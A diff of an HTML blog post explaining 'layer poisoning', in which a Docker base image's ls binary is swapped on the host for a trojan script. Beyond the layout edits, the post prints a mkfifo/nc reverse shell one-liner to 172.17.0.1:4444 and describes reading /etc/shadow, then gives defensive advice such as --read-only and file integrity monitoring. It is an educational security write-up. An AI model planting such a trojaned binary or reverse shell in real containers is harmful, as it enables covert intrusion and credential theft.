@@ -4,31 +4,36 @@
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Layer poisoning: Attacking docker from its foundations</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;600;700&family=Space+Grotesk:wght@500;600;700&display=swap" rel="stylesheet" />
     <link rel="stylesheet" href="../../styles/style.css" />
   </head>
   <body>
     <header class="site-header">
       <div class="container header-inner">
-        <a class="brand" href="../pages/blog.html">Nathan Martel</a>
+        <a class="brand" href="../../index.html">
+          <span class="prompt">nathan@martel:~$</span>
+          <span class="cursor"></span>
+        </a>
         <nav class="site-nav">
           <a href="../../index.html">Home</a>
           <a href="../../index.html#about">About</a>
+          <a href="../blog.html" class="active">Blog</a>
           <a href="../../index.html#contact">Contact</a>
-          <a href="../../pages/blog.html" class="active">Blog</a>
+          <a href="../../strava/index.html" class="nav-strava">Strava</a>
         </nav>
       </div>
     </header>
 
     <main class="container page-content">
-      <article class="section">
+      <article class="article">
         <h1>Layer poisoning, the art of compromising docker from its foundations</h1>
-        
+
         <p class="post-intro">
-          Docker containers are often presented as isolated and immutable environments. Yet, there is an attack technique called <strong>Layer poisoning</strong>. 
+          Docker containers are often presented as isolated and immutable environments. Yet, there is an attack technique called <strong>Layer poisoning</strong>.
           It allows compromising a container by silently modifying its file system layers directly on the host.
         </p>
-
-        <hr>
 
         <h2>1. The concept: poisoning the source</h2>
         <p>
@@ -76,8 +81,8 @@
         <figure>
           <img src="images/v_lp_3.png" alt="Exploring the snapshot" />
         </figure>
-        
-       <p>We replace the <code>ls</code> binary with a malicious script:</p>
+
+        <p>We replace the <code>ls</code> binary with a malicious script:</p>
 
         <figure>
           <img src="images/v_lp_4.png" alt="Modifying ls binary" />
@@ -87,30 +92,30 @@
         <pre><code>(mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 172.17.0.1 4444 > /tmp/f &) > /dev/null 2>&1</code></pre>
 
         <p>Now, when the user executes the command <code>ls /etc,</code>, here's what they observe:</p>
-        
+
         <figure>
           <img src="images/v_lp_5.png" alt="Victim executing ls" />
         </figure>
 
         <p>The display is normal, the illusion is perfect.</p>
-        
+
         <p>Attacker's side, the connection arrives:</p>
 
         <figure>
           <img src="images/a_lp_2.png" alt="Attacker receiving access" />
         </figure>
 
-        </p>We become root and can read secrets (/etc/shadow, environment variables, etc.).</p>
+        <p>We become root and can read secrets (/etc/shadow, environment variables, etc.).</p>
 
         <h2>4. After all, why is it so dangerous?</h2>
         <p>
-          What makes layer poisoning particularly insidious is its discretion. If you run <code>docker diff</code>, docker won't see any modifications because the change occurred in the <strong>lowerdir</strong> (the base image) and not in the container's write layer. 
+          What makes layer poisoning particularly insidious is its discretion. If you run <code>docker diff</code>, docker won't see any modifications because the change occurred in the <strong>lowerdir</strong> (the base image) and not in the container's write layer.
           On top of that, any new container created from this local image will be natively infected.
         </p>
 
         <h2>5. Conclusion</h2>
         <p>
-          This demonstration proves that if the host's integrity is compromised, the container is in danger. In my opinion, a few avenues for improvement... 
+          This demonstration proves that if the host's integrity is compromised, the container is in danger. In my opinion, a few avenues for improvement...
 
           Everything first relies on the PoLP to lock down access to critical containerd folders. Next, I found that there is a <code>--read-only</code> option that neutralizes the persistence of an intrusion. Finally, more advanced but there are also file integrity monitoring tools (FIM) that can be used to detect in real-time any suspicious modification within <code>/var/lib/docker</code>. Solutions like <em>Tripwire</em> or <em>AIDE</em> can be configured to monitor these sensitive directories and alert administrators in case of unexpected changes.
         </p>
@@ -119,7 +124,7 @@
     </main>
 
     <footer class="site-footer">
-      <p>Blog page of Nathan Martel — cybersecurity and automation experience shared.</p>
+      <p>Blog of Nathan Martel — cybersecurity and automation experience shared.</p>
     </footer>
   </body>
 </html>
